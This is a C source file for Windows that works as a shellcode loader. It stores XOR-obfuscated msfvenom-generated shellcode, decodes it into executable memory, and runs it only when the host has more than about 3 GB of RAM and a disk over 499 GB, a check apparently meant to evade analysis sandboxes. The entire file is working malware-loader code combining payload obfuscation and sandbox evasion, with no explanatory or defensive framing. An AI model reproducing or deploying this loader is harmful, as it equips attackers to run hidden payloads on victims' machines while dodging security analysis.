#include <Windows.h>

int main()
{
	// msfvenom generated shellcode after xoring it with "\xa1"
	char shellcode[] = \
		"\x5d\x49\x23\xa1\xa1\xa1\xc1\x28\x44\x90\x61\xc5\x2a\xf1\x91"
		"\x2a\xf3\xad\x2a\xf3\xb5\x2a\xd3\x89\xae\x16\xeb\x87\x90\x5e"
		"\x0d\x9d\xc0\xdd\xa3\x8d\x81\x60\x6e\xac\xa0\x66\x43\x53\xf3"
		"\xf6\x2a\xf3\xb1\x2a\xeb\x9d\x2a\xed\xb0\xd9\x42\xe9\xa0\x70"
		"\xf0\x2a\xf8\x81\xa0\x72\x2a\xe8\xb9\x42\x9b\xe8\x2a\x95\x2a"
		"\xa0\x77\x90\x5e\x0d\x60\x6e\xac\xa0\x66\x99\x41\xd4\x57\xa2"
		"\xdc\x59\x9a\xdc\x85\xd4\x45\xf9\x2a\xf9\x85\xa0\x72\xc7\x2a"
		"\xad\xea\x2a\xf9\xbd\xa0\x72\x2a\xa5\x2a\xa0\x71\x28\xe5\x85"
		"\x85\xfa\xfa\xc0\xf8\xfb\xf0\x5e\x41\xfe\xfe\xfb\x2a\xb3\x4a"
		"\x2c\xfc\xc9\x92\x93\xa1\xa1\xc9\xd6\xd2\x93\xfe\xf5\xc9\xed"
		"\xd6\x87\xa6\x5e\x74\x19\x31\xa0\xa1\xa1\x88\x65\xf5\xf1\xc9"
		"\x88\x21\xca\xa1\x5e\x74\xf1\xf1\xf1\xf1\xe1\xf1\xe1\xf1\xc9"
		"\x4b\xae\x7e\x41\x5e\x74\x36\xcb\xa4\xc9\x61\x09\x9b\x3e\xc9"
		"\xa3\xa1\x86\xae\x28\x47\xcb\xb1\xf7\xf6\xc9\x38\x04\xd5\xc0"
		"\x5e\x74\x24\x61\xd5\xad\x5e\xef\xa9\xd4\x4d\xc9\x51\x14\x03"
		"\xf7\x5e\x74\xc9\xc2\xcc\xc5\xa1\x28\x42\xf6\xf6\xf6\x90\x57"
		"\xcb\xb3\xf8\xf7\x43\x5c\xc7\x66\xe5\x85\x9d\xa0\xa0\x2c\xe5"
		"\x85\xb1\x67\xa1\xe5\xf5\xf1\xf7\xf7\xf7\xe7\xf7\xef\xf7\xf7"
		"\xf2\xf7\xc9\xd8\x6d\x9e\x27\x5e\x74\x28\x41\xef\xf7\xe7\x5e"
		"\x91\xc9\xa9\x26\xbc\xc1\x5e\x74\x1a\x51\x14\x03\xf7\xc9\x07"
		"\x34\x1c\x3c\x5e\x74\x9d\xa7\xdd\xab\x21\x5a\x41\xd4\xa4\x1a"
		"\xe6\xb2\xd3\xce\xcb\xa1\xf2\x5e\x74";

	// alocate space in the process
	void *exec_shellcode = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	
	// copying the shellcode into the allocated space
	memcpy(exec_shellcode, shellcode, sizeof shellcode);
	
	// xoring the shellcode
	for (int i = 0; i < sizeof shellcode; i++)
	{
		((char*)exec_shellcode)[i] = (((char*)exec_shellcode)[i]) ^ '\xa1';
	}

	// execute the shellcode if the RAM>3GB and HardDisk>499GB
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	GlobalMemoryStatusEx(&memoryStatus);
	DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	DISK_GEOMETRY pDiskGeometry;
	DWORD bytesReturned;
	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
	DWORD diskSizeGB;
	diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
	if ( RAMMB > 3000 && diskSizeGB > 499){
		((void(*)())exec_shellcode)();
	}
	return 0;
	
	return 0;
}
